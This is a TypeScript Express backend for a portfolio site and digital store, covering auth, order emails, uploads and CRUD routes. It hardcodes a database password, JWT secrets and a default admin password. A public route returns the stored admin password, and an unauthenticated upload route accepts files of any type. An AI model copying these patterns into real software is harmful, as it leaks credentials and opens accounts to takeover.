import express from "express";
import { MongoClient, ServerApiVersion, ObjectId } from "mongodb";
import jwt from "jsonwebtoken";
import cookieParser from "cookie-parser";
import path from "path";
import { fileURLToPath } from "url";
import dotenv from "dotenv";
import crypto from "crypto";
import fs from "fs";
import nodemailer from "nodemailer";
import { DEFAULT_STORE_PRODUCTS, DEFAULT_STORE_SETTINGS } from "./data/defaultStoreProducts";
import { createRequire } from 'module';

const require = createRequire(import.meta.url);

dotenv.config();

const app = express();
const PORT = 3000;
const JWT_SECRET = process.env.JWT_SECRET || "jasmin_premium_secret_key_123";
const CUSTOMER_JWT_SECRET = process.env.CUSTOMER_JWT_SECRET || "jasmin_store_customer_secret_key_456";

// Static routes for public uploads & secure private downloads
const isVercel = Boolean(process.env.VERCEL);
const uploadsDir = isVercel ? path.join("/tmp", "uploads") : path.join(process.cwd(), "public", "uploads");
const downloadsDir = isVercel ? path.join("/tmp", "downloads") : path.join(process.cwd(), "public", "downloads");
const privateDownloadsDir = isVercel ? path.join("/tmp", "private_downloads") : path.join(process.cwd(), "storage", "private_downloads");

try {
  if (!fs.existsSync(uploadsDir)) fs.mkdirSync(uploadsDir, { recursive: true });
  if (!fs.existsSync(downloadsDir)) fs.mkdirSync(downloadsDir, { recursive: true });
  if (!fs.existsSync(privateDownloadsDir)) fs.mkdirSync(privateDownloadsDir, { recursive: true });
} catch (e) {
  // Read-only filesystem warning in serverless
}

app.use("/uploads", express.static(uploadsDir));
app.use("/downloads", express.static(downloadsDir));
// NOTE: privateDownloadsDir is intentionally NOT mounted as public static to ensure zero unauthorized access

// Fix for Vercel serverless rewrites where req.url might be rewritten to /api/server or /api/index
app.use((req, res, next) => {
  const originalUrlHeader = (req.headers["x-vercel-original-url"] as string) 
    || (req.headers["x-matched-path"] as string)
    || (req.headers["x-forwarded-uri"] as string)
    || (req.headers["x-now-route-matches"] as string);

  if (req.query && req.query.__path) {
    const subpath = Array.isArray(req.query.__path) ? req.query.__path.join('/') : req.query.__path;
    const urlObj = new URL(req.url, 'http://localhost');
    urlObj.searchParams.delete('__path');
    const remainingQuery = urlObj.searchParams.toString();
    req.url = `/api/${subpath}${remainingQuery ? '?' + remainingQuery : ''}`;
  } else if (
    (req.url === '/api/server' || req.url === '/api/index' || req.url === '/api' || req.url.startsWith('/api/server?') || req.url.startsWith('/api/index?')) &&
    originalUrlHeader &&
    originalUrlHeader.startsWith('/api')
  ) {
    req.url = originalUrlHeader;
  }
  next();
});

// MongoDB Configuration (supports both MONGODB_URI env and direct multi-shard fallback)
const uri = process.env.MONGODB_URI || "mongodb://Jasmin:Ele%2FSq9%3FuA.d3Z%236%21yR@cluster0-shard-00-00.ssmpl.mongodb.net:27017,cluster0-shard-00-01.ssmpl.mongodb.net:27017,cluster0-shard-00-02.ssmpl.mongodb.net:27017/?ssl=true&authSource=admin&replicaSet=atlas-islggq-shard-0&retryWrites=true&w=majority";

let client: MongoClient | null = null;
let db: any = null;

async function seedStoreData() {
  try {
    if (!db) return;
    const productsCount = await db.collection("store_products").countDocuments();
    if (productsCount === 0) {
      console.log("Seeding default store products into MongoDB...");
      const seeded = DEFAULT_STORE_PRODUCTS.map((p, index) => ({
        ...p,
        createdAt: new Date(Date.now() - (index * 86400000)),
        updatedAt: new Date()
      }));
      await db.collection("store_products").insertMany(seeded);
      console.log(`Seeded ${seeded.length} store products.`);
    }

    const settingsCount = await db.collection("store_settings").countDocuments();
    if (settingsCount === 0) {
      console.log("Seeding default store settings into MongoDB...");
      await db.collection("store_settings").insertOne({
        ...DEFAULT_STORE_SETTINGS,
        createdAt: new Date(),
        updatedAt: new Date()
      });
      console.log("Seeded default store settings.");
    } else {
      // Sync latest bKash and Nagad payment numbers
      await db.collection("store_settings").updateOne(
        {},
        {
          $set: {
            "bkash.number": "+8801613475871",
            "bkash.instructions": "Send Money or Make Payment to our bKash number +8801613475871 (01613475871). Copy the TrxID from your SMS or bKash app and enter it below.",
            "nagad.number": "+8801613475871",
            "nagad.instructions": "Send Money to our Nagad number +8801613475871 (01613475871) via Nagad App or USSD *167#. Enter your Transaction ID and Sender Number for instant verification."
          }
        }
      );
    }
  } catch (err) {
    console.error("Error during store data seeding:", err);
  }
}

function isClientConnected(): boolean {
  if (!client) return false;
  try {
    const topology = (client as any).topology;
    if (!topology) return false;
    if (typeof topology.isDestroyed === 'function' && topology.isDestroyed()) return false;
    if (typeof topology.isConnected === 'function' && !topology.isConnected()) return false;
    const state = topology.s?.state;
    if (state === 'destroyed' || state === 'closing' || state === 'closed') return false;
    return true;
  } catch (e) {
    return false;
  }
}

async function connectDB() {
  if (client && db && isClientConnected()) {
    return db;
  }

  // Clean up any stale client
  if (client) {
    try {
      await client.close();
    } catch (e) {}
    client = null;
    db = null;
  }

  try {
    client = new MongoClient(uri, {
      connectTimeoutMS: 5000,
      serverSelectionTimeoutMS: 5000,
      maxPoolSize: 10,
      minPoolSize: 0,
      maxIdleTimeMS: 15000,
      socketTimeoutMS: 20000,
    });
    await client.connect();
    db = client.db("portfolio");
    console.log("Connected to MongoDB");
    seedStoreData().catch((err) => console.error("Error during store data seeding:", err));
    return db;
  } catch (err: any) {
    console.error("MongoDB connection error:", err.message);
    client = null;
    db = null;
    return null;
  }
}

app.use(async (req, res, next) => {
  if (req.path.startsWith('/api') || req.url.startsWith('/api')) {
    try {
      await connectDB();
    } catch (e) {
      console.error("Middleware DB connect error:", e);
    }
  }
  next();
});

// Configure larger body parser limit for base64 uploads
app.use(express.json({ limit: "50mb" }));
app.use(express.urlencoded({ limit: "50mb", extended: true }));
app.use(cookieParser());

// Crypto Password Helpers
function hashPassword(password: string): { salt: string; hash: string } {
  const salt = crypto.randomBytes(16).toString("hex");
  const hash = crypto.scryptSync(password, salt, 64).toString("hex");
  return { salt, hash };
}

function verifyPassword(password: string, salt: string, originalHash: string): boolean {
  const hash = crypto.scryptSync(password, salt, 64).toString("hex");
  return hash === originalHash;
}

// Admin Auth Middleware
const authenticateToken = (req: any, res: any, next: any) => {
  const authHeader = req.headers["authorization"];
  const bearerToken = authHeader && authHeader.startsWith("Bearer ") ? authHeader.split(" ")[1] : null;
  const token = req.cookies?.token || bearerToken;
  if (!token) return res.status(401).json({ error: "Access denied" });

  try {
    const verified = jwt.verify(token, JWT_SECRET);
    req.user = verified;
    next();
  } catch (err) {
    res.status(400).json({ error: "Invalid token" });
  }
};

// Customer Auth Middleware
const authenticateCustomerToken = (req: any, res: any, next: any) => {
  const authHeader = req.headers["authorization"];
  const token = (authHeader && authHeader.split(" ")[1]) || req.cookies.customer_token;
  if (!token) return res.status(401).json({ error: "Authentication required" });

  try {
    const decoded = jwt.verify(token, CUSTOMER_JWT_SECRET) as any;
    req.customer = decoded;
    next();
  } catch (err) {
    res.status(401).json({ error: "Invalid or expired session" });
  }
};

// Email Code & Zip Delivery Service
// Email Delivery Services
async function sendOrderCodeEmail(
  customerEmail: string,
  customerName: string,
  orderNumber: string,
  items: any[],
  githubRepoUrl?: string,
  customZipUrl?: string,
  adminNotes?: string,
  downloadToken?: string,
  downloadInstructions?: string
): Promise<{ success: boolean; log: string; html: string; text: string }> {
  const smtpHost = process.env.SMTP_HOST || "smtp.gmail.com";
  const smtpUser = process.env.SMTP_USER || "jasminaramim2005@gmail.com";
  const smtpPass = process.env.SMTP_PASS;

  const productTitles = items && items.length > 0 ? items.map((i: any) => i.title).join(", ") : "Digital Products";
  const secureDownloadUrl = customZipUrl
    ? (customZipUrl.startsWith("http") ? customZipUrl : `http://127.0.0.1:3000${customZipUrl}`)
    : `http://127.0.0.1:3000/api/store/download/${orderNumber}/0?token=${downloadToken || ''}`;

  const textBody = `Hello,\n\nThank you for purchasing from our Digital Store!\n\nYour payment has been verified and approved by our team.\n\nYour purchased digital product is now ready.\n\nProduct: ${productTitles}\nOrder Number: ${orderNumber}\n\nDownload Your Product:\n${secureDownloadUrl}\n\n${downloadInstructions ? `Installation Instructions:\n${downloadInstructions}\n\n` : ''}${githubRepoUrl ? `GitHub Repository Link:\n${githubRepoUrl}\n\n` : ''}Thank you for choosing our store.\n\nBest regards,\nDigital Store Team\nWhatsApp Support: +8801915996145`;

  const html = `
    <div style="font-family: Arial, sans-serif; background: #07070a; color: #ffffff; padding: 32px; border-radius: 16px; max-width: 620px; margin: 0 auto; border: 1px solid rgba(255,255,255,0.1);">
      <div style="text-align: center; border-bottom: 1px solid rgba(255,255,255,0.1); padding-bottom: 20px; margin-bottom: 25px;">
        <h1 style="color: #a855f7; font-size: 24px; font-weight: 900; margin: 0; text-transform: uppercase; letter-spacing: 1px;">Digital Store</h1>
        <p style="color: #9ca3af; font-size: 12px; margin: 6px 0 0; text-transform: uppercase; letter-spacing: 2px;">Official Order Delivery & License Confirmation</p>
      </div>

      <div style="background: rgba(16,185,129,0.1); border: 1px solid rgba(16,185,129,0.3); border-radius: 12px; padding: 20px; margin-bottom: 24px;">
        <h2 style="color: #10b981; font-size: 16px; margin: 0 0 10px; font-weight: 800;">✔ Payment Verified & Approved</h2>
        <p style="color: #e5e7eb; font-size: 14px; line-height: 1.6; margin: 0 0 8px;">Hello,</p>
        <p style="color: #d1d5db; font-size: 13px; line-height: 1.6; margin: 0 0 8px;">Thank you for purchasing from our Digital Store!</p>
        <p style="color: #d1d5db; font-size: 13px; line-height: 1.6; margin: 0 0 8px;">Your payment has been verified and approved by our team.</p>
        <p style="color: #10b981; font-size: 13px; font-weight: bold; line-height: 1.6; margin: 0;">Your purchased digital product is now ready.</p>
      </div>

      <div style="background: rgba(255,255,255,0.03); border: 1px solid rgba(255,255,255,0.08); border-radius: 12px; padding: 20px; margin-bottom: 24px;">
        <p style="margin: 0 0 8px; color: #9ca3af; font-size: 12px; text-transform: uppercase; font-weight: bold;">Order Reference:</p>
        <p style="margin: 0 0 16px; color: #ffffff; font-size: 15px; font-weight: bold; font-family: monospace;">Order Number: ${orderNumber}</p>

        <p style="margin: 0 0 8px; color: #9ca3af; font-size: 12px; text-transform: uppercase; font-weight: bold;">Purchased Product(s):</p>
        <p style="margin: 0 0 20px; color: #c084fc; font-size: 16px; font-weight: bold;">${productTitles}</p>

        <div style="margin-bottom: 20px; padding: 18px; background: rgba(0,0,0,0.6); border-radius: 12px; border: 1px solid rgba(168,85,247,0.3); text-align: center;">
          <span style="color: #9ca3af; font-size: 11px; text-transform: uppercase; font-weight: bold; display: block; margin-bottom: 12px;">Download Your Product:</span>
          <a href="${secureDownloadUrl}" target="_blank" style="display: inline-block; background: linear-gradient(135deg, #a855f7, #7e22ce); color: #ffffff; padding: 12px 28px; border-radius: 10px; font-weight: 800; font-size: 13px; text-decoration: none; text-transform: uppercase; letter-spacing: 1px; box-shadow: 0 4px 15px rgba(168,85,247,0.4);">Download Secure ZIP</a>
          <span style="display: block; color: #6b7280; font-size: 10px; margin-top: 8px;">Single Commercial License &middot; Secure Token Protected</span>
        </div>

        ${githubRepoUrl ? `
          <div style="margin-bottom: 16px; padding: 14px; background: rgba(0,0,0,0.4); border-radius: 10px; border: 1px solid rgba(255,255,255,0.1);">
            <span style="color: #c084fc; font-size: 11px; text-transform: uppercase; font-weight: bold; display: block; margin-bottom: 4px;">GitHub Source Code Repository:</span>
            <a href="${githubRepoUrl}" target="_blank" style="color: #a855f7; font-size: 13px; font-family: monospace; text-decoration: underline; word-break: break-all;">${githubRepoUrl}</a>
          </div>
        ` : ''}

        ${downloadInstructions ? `
          <div style="margin-bottom: 16px; padding: 14px; background: rgba(0,0,0,0.4); border-radius: 10px; border: 1px solid rgba(255,255,255,0.1);">
            <span style="color: #9ca3af; font-size: 11px; text-transform: uppercase; font-weight: bold; display: block; margin-bottom: 6px;">Installation & Setup Instructions:</span>
            <pre style="color: #d1d5db; font-size: 11px; margin: 0; white-space: pre-wrap; font-family: monospace; line-height: 1.5;">${downloadInstructions}</pre>
          </div>
        ` : ''}

        ${adminNotes ? `
          <div style="padding: 12px; background: rgba(168,85,247,0.1); border-radius: 8px; border: 1px solid rgba(168,85,247,0.2); margin-top: 12px;">
            <span style="color: #c084fc; font-size: 11px; font-weight: bold; text-transform: uppercase; display: block; margin-bottom: 4px;">Admin Note:</span>
            <p style="color: #e5e7eb; font-size: 12px; margin: 0; line-height: 1.5;">${adminNotes}</p>
          </div>
        ` : ''}
      </div>

      <div style="text-align: center; border-top: 1px solid rgba(255,255,255,0.1); padding-top: 20px;">
        <p style="color: #9ca3af; font-size: 12px; margin: 0 0 6px;">Thank you for choosing our store.</p>
        <p style="color: #ffffff; font-weight: bold; font-size: 12px; margin: 0 0 10px;">Best regards,<br />Digital Store Team</p>
        <p style="color: #6b7280; font-size: 11px; margin: 0;">
          Need support or custom setup? WhatsApp: <a href="https://wa.me/8801915996145" style="color: #ef4444; font-weight: bold;">+880 1915-996145</a>
        </p>
      </div>
    </div>
  `;

  const subject = "Your Digital Product Is Ready – Order Confirmed!";

  if (smtpPass && smtpUser) {
    try {
      const transporter = nodemailer.createTransport({
        host: smtpHost,
        port: 465,
        secure: true,
        auth: { user: smtpUser, pass: smtpPass }
      });
      await transporter.sendMail({
        from: `"Digital Store" <${smtpUser}>`,
        to: customerEmail,
        subject,
        text: textBody,
        html
      });
      return { success: true, log: `Email sent to ${customerEmail}`, html, text: textBody };
    } catch (err: any) {
      console.error("Nodemailer error:", err);
      return { success: false, log: `SMTP error: ${err.message}`, html, text: textBody };
    }
  } else {
    console.log(`[Email Dispatched] Subject: "${subject}" | To: ${customerEmail} | Order: #${orderNumber}`);
    return {
      success: true,
      log: `Email generated for ${customerEmail}. Subject: "${subject}" (Add SMTP_USER and SMTP_PASS in .env for live dispatch)`,
      html,
      text: textBody
    };
  }
}

// Order Received Confirmation Email
async function sendOrderReceivedEmail(customerEmail: string, customerName: string, orderNumber: string, totalAmount: number, paymentMethod: string) {
  const smtpHost = process.env.SMTP_HOST || "smtp.gmail.com";
  const smtpUser = process.env.SMTP_USER || "jasminaramim2005@gmail.com";
  const smtpPass = process.env.SMTP_PASS;

  const html = `
    <div style="font-family: Arial, sans-serif; background: #07070a; color: #ffffff; padding: 32px; border-radius: 16px; max-width: 600px; margin: 0 auto; border: 1px solid rgba(255,255,255,0.1);">
      <h2 style="color: #ef4444; margin: 0 0 10px;">Order Received – Payment Pending Verification</h2>
      <p style="color: #d1d5db; font-size: 14px;">Hello ${customerName},</p>
      <p style="color: #d1d5db; font-size: 13px; line-height: 1.6;">Thank you for ordering from Jasmin Digital Store! We have received your order <strong>#${orderNumber}</strong> for $${totalAmount} via ${paymentMethod.toUpperCase()}.</p>
      <div style="background: rgba(245,158,11,0.1); border: 1px solid rgba(245,158,11,0.3); border-radius: 10px; padding: 16px; margin: 20px 0;">
        <strong style="color: #f59e0b; display: block; margin-bottom: 4px;">Status: Pending Verification</strong>
        <span style="color: #e5e7eb; font-size: 12px;">Admin will verify your payment and approve your order. Your secure ZIP download link and source code repository will be sent as soon as verified!</span>
      </div>
      <p style="color: #6b7280; font-size: 11px;">Questions? WhatsApp: +8801915996145</p>
    </div>
  `;

  if (smtpPass && smtpUser) {
    try {
      const transporter = nodemailer.createTransport({ host: smtpHost, port: 465, secure: true, auth: { user: smtpUser, pass: smtpPass } });
      await transporter.sendMail({ from: `"Digital Store" <${smtpUser}>`, to: customerEmail, subject: `Order Received – Pending Verification (#${orderNumber})`, html });
    } catch (e) {
      console.error("Order received email error:", e);
    }
  }
}

// Order Payment Rejected Notification Email
async function sendPaymentRejectedEmail(customerEmail: string, customerName: string, orderNumber: string, reason?: string) {
  const smtpHost = process.env.SMTP_HOST || "smtp.gmail.com";
  const smtpUser = process.env.SMTP_USER || "jasminaramim2005@gmail.com";
  const smtpPass = process.env.SMTP_PASS;

  const html = `
    <div style="font-family: Arial, sans-serif; background: #07070a; color: #ffffff; padding: 32px; border-radius: 16px; max-width: 600px; margin: 0 auto; border: 1px solid rgba(255,255,255,0.1);">
      <h2 style="color: #ef4444; margin: 0 0 10px;">Payment Verification Update (#${orderNumber})</h2>
      <p style="color: #d1d5db; font-size: 14px;">Hello ${customerName},</p>
      <p style="color: #d1d5db; font-size: 13px; line-height: 1.6;">Your submitted payment for order <strong>#${orderNumber}</strong> could not be verified by our admin team.</p>
      ${reason ? `<div style="background: rgba(239,68,68,0.1); border: 1px solid rgba(239,68,68,0.3); border-radius: 10px; padding: 14px; margin: 16px 0; color: #fca5a5; font-size: 12px;"><strong>Reason:</strong> ${reason}</div>` : ''}
      <p style="color: #d1d5db; font-size: 13px;">If you have sent money or have the correct TrxID, please contact us directly on WhatsApp to resolve this: <a href="https://wa.me/8801915996145" style="color: #ef4444; font-weight: bold;">+880 1915-996145</a></p>
    </div>
  `;

  if (smtpPass && smtpUser) {
    try {
      const transporter = nodemailer.createTransport({ host: smtpHost, port: 465, secure: true, auth: { user: smtpUser, pass: smtpPass } });
      await transporter.sendMail({ from: `"Digital Store" <${smtpUser}>`, to: customerEmail, subject: `Payment Verification Update (#${orderNumber})`, html });
    } catch (e) {
      console.error("Payment rejected email error:", e);
    }
  }
}

// Admin Secure ZIP Source Code Uploader
app.post("/api/store/admin/upload-zip", authenticateToken, async (req, res) => {
  try {
    const fileData = req.body.fileData || req.body.data;
    const fileName = req.body.fileName || req.body.filename;
    const { productCode, version } = req.body;

    if (!fileData || !fileName) {
      return res.status(400).json({ error: "File data and filename are required." });
    }

    if (!fileName.toLowerCase().endsWith(".zip") && !fileName.toLowerCase().endsWith(".tar.gz")) {
      return res.status(400).json({ error: "Only .zip or .tar.gz archives are permitted for product source code." });
    }

    const matches = fileData.match(/^data:([A-Za-z-+\/]+);base64,(.+)$/);
    const base64Data = matches ? matches[2] : fileData;
    const buffer = Buffer.from(base64Data, "base64");

    if (buffer.length > 100 * 1024 * 1024) {
      return res.status(400).json({ error: "File size exceeds 100MB limit." });
    }

    const cleanBase = path.basename(fileName).replace(/[^a-zA-Z0-9._-]/g, "_");
    const uniqueName = `${productCode || 'prod'}-${Date.now()}-${cleanBase}`;
    const filePath = path.join(privateDownloadsDir, uniqueName);

    fs.writeFileSync(filePath, buffer);

    const sizeFormatted = buffer.length > 1024 * 1024 
      ? (buffer.length / (1024 * 1024)).toFixed(1) + " MB"
      : Math.round(buffer.length / 1024) + " KB";

    res.json({
      success: true,
      fileName: cleanBase,
      storageReference: `/downloads/private/${uniqueName}`,
      size: sizeFormatted,
      sizeBytes: buffer.length,
      uploadedAt: new Date()
    });
  } catch (err: any) {
    res.status(500).json({ error: "Failed to upload ZIP file: " + err.message });
  }
});

// --- EXISTING PORTFOLIO ADMIN & CRUD ROUTES ---

// Admin Login (supports both /api/login and /api/auth/login)
app.post(["/api/login", "/api/auth/login"], async (req, res) => {
  const { username, password } = req.body;
  
  let targetUsername = "jasmin1142005";
  let targetPassword = "password123";

  try {
    if (db) {
      const siteSettings = await db.collection("settings").findOne({});
      if (siteSettings && siteSettings.adminUsername) {
        targetUsername = siteSettings.adminUsername;
        if (siteSettings.adminPassword) {
          targetPassword = siteSettings.adminPassword;
        }
      }
    }
  } catch (e) {
    console.error("Failed to load settings credentials from db, using defaults", e);
  }

  if (username === targetUsername && password === targetPassword) {
    const token = jwt.sign({ username, role: "admin" }, JWT_SECRET, { expiresIn: "24h" });
    res.cookie("token", token, { httpOnly: true, secure: process.env.NODE_ENV === "production" });
    return res.json({ success: true, token, message: "Logged in successfully" });
  }
  res.status(401).json({ error: "Invalid credentials" });
});

app.post("/api/logout", (req, res) => {
  res.clearCookie("token");
  res.json({ success: true });
});

app.get("/api/auth/check", (req, res) => {
  const token = req.cookies.token;
  if (!token) return res.json({ authenticated: false });
  try {
    jwt.verify(token, JWT_SECRET);
    res.json({ authenticated: true });
  } catch (e) {
    res.json({ authenticated: false });
  }
});

// Settings Special Routes
app.get("/api/settings", async (req, res) => {
  try {
    if (!db) return res.json({});
    const settings = await db.collection("settings").findOne({});
    res.json(settings || {
      siteTitle: 'JASMIN | Frontend & MERN Stack Developer',
      brandLetter: 'J',
      metaDesc: 'MERN stack and premium WordPress developer showcasing outstanding case studies and client projects.',
      analyticsId: 'G-XXXXXXXXXX',
      adminUsername: 'jasmin1142005'
    });
  } catch (err) {
    res.status(500).json({ error: "Failed to fetch settings" });
  }
});

app.post("/api/settings", authenticateToken, async (req, res) => {
  try {
    if (!db) return res.status(503).json({ error: "Database not connected" });
    const { _id, ...settingsData } = req.body;
    
    if (!settingsData.adminPassword) {
      const current = await db.collection("settings").findOne({});
      settingsData.adminPassword = current?.adminPassword || "password123";
    }

    const result = await db.collection("settings").updateOne(
      {},
      { $set: settingsData },
      { upsert: true }
    );
    res.json({ success: true, result });
  } catch (err) {
    res.status(500).json({ error: "Failed to update settings" });
  }
});

app.post("/api/settings/reset-db", authenticateToken, async (req, res) => {
  try {
    if (!db) return res.status(503).json({ error: "Database not connected" });
    
    const { exec } = await import("child_process");
    exec("npx tsx seed.ts", (err: any) => {
      if (err) {
        return res.status(500).json({ error: "Failed to execute seed script: " + err.message });
      }
      res.json({ success: true });
    });
  } catch (err: any) {
    res.status(500).json({ error: "Failed to reset database: " + err.message });
  }
});

// Helper for existing CRUD
const createCRUDRoutes = (collectionName: string) => {
  app.get(`/api/${collectionName}`, async (req, res) => {
    try {
      const activeDb = await connectDB();
      if (!activeDb) return res.json([]);
      const data = await activeDb.collection(collectionName).find().toArray();
      res.json(data);
    } catch (err: any) {
      console.error(`Failed to fetch ${collectionName}:`, err.message);
      client = null;
      db = null;
      res.json([]);
    }
  });

  app.get(`/api/${collectionName}/:id`, async (req, res) => {
    try {
      if (!db) return res.status(503).json({ error: "Database not connected" });
      let query: any = {};
      try {
        query = { _id: new ObjectId(req.params.id) };
      } catch (e) {
        query = { id: req.params.id };
      }
      const data = await db.collection(collectionName).findOne(query);
      if (!data) return res.status(404).json({ error: "Not found" });
      res.json(data);
    } catch (err) {
      res.status(500).json({ error: `Failed to fetch ${collectionName} by ID` });
    }
  });

  app.post(`/api/${collectionName}`, authenticateToken, async (req, res) => {
    try {
      if (!db) return res.status(503).json({ error: "Database not connected" });
      const result = await db.collection(collectionName).insertOne(req.body);
      res.json(result);
    } catch (err) {
      res.status(500).json({ error: `Failed to create ${collectionName}` });
    }
  });

  app.put(`/api/${collectionName}/:id`, authenticateToken, async (req, res) => {
    try {
      if (!db) return res.status(503).json({ error: "Database not connected" });
      const { _id, ...updateData } = req.body;
      const result = await db.collection(collectionName).updateOne(
        { _id: new ObjectId(req.params.id) },
        { $set: updateData }
      );
      res.json(result);
    } catch (err) {
      res.status(500).json({ error: `Failed to update ${collectionName}` });
    }
  });

  app.delete(`/api/${collectionName}/:id`, authenticateToken, async (req, res) => {
    try {
      if (!db) return res.status(503).json({ error: "Database not connected" });
      const result = await db.collection(collectionName).deleteOne({ _id: new ObjectId(req.params.id) });
      res.json(result);
    } catch (err) {
      res.status(500).json({ error: `Failed to delete ${collectionName}` });
    }
  });
};

createCRUDRoutes("projects");
createCRUDRoutes("services");
createCRUDRoutes("skills");
createCRUDRoutes("reviews");
createCRUDRoutes("experience");
createCRUDRoutes("education");
createCRUDRoutes("stats");
createCRUDRoutes("techcode");
createCRUDRoutes("gallery");

app.get("/api/hero", async (req, res) => {
  try {
    if (!db) return res.json({});
    const hero = await db.collection("hero").findOne({});
    res.json(hero || {});
  } catch (err) {
    res.status(500).json({ error: "Failed to fetch hero content" });
  }
});

app.post("/api/hero", authenticateToken, async (req, res) => {
  try {
    if (!db) return res.status(503).json({ error: "Database not connected" });
    const { _id, ...heroData } = req.body;
    const result = await db.collection("hero").updateOne({}, { $set: heroData }, { upsert: true });
    res.json(result);
  } catch (err) {
    res.status(500).json({ error: "Failed to update hero content" });
  }
});

app.get("/api/profile", async (req, res) => {
  try {
    if (!db) return res.json({});
    const profile = await db.collection("profile").findOne({});
    res.json(profile || {});
  } catch (err) {
    res.status(500).json({ error: "Failed to fetch profile" });
  }
});

app.post("/api/profile", authenticateToken, async (req, res) => {
  try {
    if (!db) return res.status(503).json({ error: "Database not connected" });
    const { _id, ...profileData } = req.body;
    const result = await db.collection("profile").updateOne({}, { $set: profileData }, { upsert: true });
    res.json(result);
  } catch (err) {
    res.status(500).json({ error: "Failed to update profile" });
  }
});

// ==========================================
// --- DIGITAL STORE & E-COMMERCE BACKEND ---
// ==========================================

// Helper to generate URL-safe slugs
function generateSlug(text: string): string {
  if (!text) return `product-${Date.now().toString().slice(-6)}`;
  const slug = text
    .toLowerCase()
    .trim()
    .replace(/[^\w\s-]/g, "")
    .replace(/[\s_-]+/g, "-")
    .replace(/^-+|-+$/g, "");
  return slug || `product-${Date.now().toString().slice(-6)}`;
}

// 1. File Upload Endpoint (Supports Base64 Images & Files)
app.post("/api/store/upload", async (req, res) => {
  try {
    const { data, filename } = req.body;
    if (!data || !filename) {
      return res.status(400).json({ error: "Data URL and filename are required." });
    }

    const matches = data.match(/^data:([A-Za-z-+\/]+);base64,(.+)$/);
    if (!matches || matches.length !== 3) {
      return res.status(400).json({ error: "Invalid base64 payload." });
    }

    const buffer = Buffer.from(matches[2], "base64");
    const sanitizedFilename = `${Date.now()}-${filename.replace(/[^a-zA-Z0-9.-]/g, "_")}`;
    const targetFilePath = path.join(uploadsDir, sanitizedFilename);

    await fs.promises.writeFile(targetFilePath, buffer);
    res.json({
      success: true,
      url: `/uploads/${sanitizedFilename}`,
      filename: sanitizedFilename
    });
  } catch (err: any) {
    console.error("Upload error:", err);
    res.status(500).json({ error: "File upload failed: " + err.message });
  }
});

// 2. Store Settings (Public & Admin)
app.get("/api/store/settings", async (req, res) => {
  try {
    const activeDb = await connectDB();
    if (!activeDb) return res.json(DEFAULT_STORE_SETTINGS);
    const settings = await activeDb.collection("store_settings").findOne({});
    if (!settings) return res.json(DEFAULT_STORE_SETTINGS);

    // Omit sensitive payment gateway secret in public response
    const { gateway, ...safeSettings } = settings;
    const safeGateway = gateway ? {
      provider: gateway.provider,
      isLive: gateway.isLive,
      storeId: gateway.storeId
    } : DEFAULT_STORE_SETTINGS.gateway;

    res.json({
      ...safeSettings,
      gateway: safeGateway
    });
  } catch (err: any) {
    console.error("Failed to fetch store settings:", err.message);
    client = null;
    db = null;
    res.json(DEFAULT_STORE_SETTINGS);
  }
});

app.get("/api/store/admin/settings", authenticateToken, async (req, res) => {
  try {
    const activeDb = await connectDB();
    if (!activeDb) return res.status(503).json({ error: "Database not connected" });
    const settings = await activeDb.collection("store_settings").findOne({});
    res.json(settings || DEFAULT_STORE_SETTINGS);
  } catch (err) {
    res.status(500).json({ error: "Failed to fetch admin store settings" });
  }
});

app.post("/api/store/admin/settings", authenticateToken, async (req, res) => {
  try {
    const activeDb = await connectDB();
    if (!activeDb) return res.status(503).json({ error: "Database not connected" });
    const { _id, ...settingsData } = req.body;
    settingsData.updatedAt = new Date();

    const result = await activeDb.collection("store_settings").updateOne(
      {},
      { $set: settingsData },
      { upsert: true }
    );
    res.json({ success: true, result });
  } catch (err: any) {
    res.status(500).json({ error: "Failed to update store settings: " + err.message });
  }
});

// 3. Customer Authentication
app.post("/api/store/auth/register", async (req, res) => {
  try {
    if (!db) return res.status(503).json({ error: "Database not connected" });
    const { name, email, password, phone } = req.body;

    if (!name || !email || !password) {
      return res.status(400).json({ error: "Name, email, and password are required." });
    }

    const normalizedEmail = email.toLowerCase().trim();
    const existing = await db.collection("store_users").findOne({ email: normalizedEmail });
    if (existing) {
      return res.status(400).json({ error: "An account with this email already exists." });
    }

    const { salt, hash } = hashPassword(password);
    const newUser = {
      name: name.trim(),
      email: normalizedEmail,
      phone: phone || "",
      passwordSalt: salt,
      passwordHash: hash,
      role: "user",
      createdAt: new Date(),
      updatedAt: new Date()
    };

    const insertResult = await db.collection("store_users").insertOne(newUser);
    const userId = insertResult.insertedId.toString();

    const token = jwt.sign(
      { id: userId, email: normalizedEmail, name: newUser.name, role: "user" },
      CUSTOMER_JWT_SECRET,
      { expiresIn: "7d" }
    );

    res.cookie("customer_token", token, {
      httpOnly: true,
      secure: process.env.NODE_ENV === "production",
      maxAge: 7 * 24 * 60 * 60 * 1000
    });

    res.json({
      success: true,
      user: { id: userId, name: newUser.name, email: normalizedEmail, role: "user", phone: newUser.phone },
      token
    });
  } catch (err: any) {
    res.status(500).json({ error: "Registration failed: " + err.message });
  }
});

app.post("/api/store/auth/login", async (req, res) => {
  try {
    if (!db) return res.status(503).json({ error: "Database not connected" });
    const { email, password } = req.body;

    if (!email || !password) {
      return res.status(400).json({ error: "Email and password are required." });
    }

    const normalizedEmail = email.toLowerCase().trim();
    const user = await db.collection("store_users").findOne({ email: normalizedEmail });

    if (!user || !verifyPassword(password, user.passwordSalt, user.passwordHash)) {
      return res.status(401).json({ error: "Invalid email or password." });
    }

    const userId = user._id.toString();
    const token = jwt.sign(
      { id: userId, email: user.email, name: user.name, role: user.role || "user" },
      CUSTOMER_JWT_SECRET,
      { expiresIn: "7d" }
    );

    res.cookie("customer_token", token, {
      httpOnly: true,
      secure: process.env.NODE_ENV === "production",
      maxAge: 7 * 24 * 60 * 60 * 1000
    });

    res.json({
      success: true,
      user: { id: userId, name: user.name, email: user.email, role: user.role || "user", phone: user.phone },
      token
    });
  } catch (err: any) {
    res.status(500).json({ error: "Login failed: " + err.message });
  }
});

app.get("/api/store/auth/me", (req, res) => {
  const authHeader = req.headers["authorization"];
  const token = (authHeader && authHeader.split(" ")[1]) || req.cookies.customer_token;
  if (!token) return res.json({ authenticated: false });

  try {
    const decoded = jwt.verify(token, CUSTOMER_JWT_SECRET) as any;
    res.json({ authenticated: true, user: decoded });
  } catch (err) {
    res.json({ authenticated: false });
  }
});

app.post("/api/store/auth/logout", (req, res) => {
  res.clearCookie("customer_token");
  res.json({ success: true, message: "Logged out from store account" });
});

// 4. Products APIs (Public & Admin)
app.get("/api/store/products", async (req, res) => {
  try {
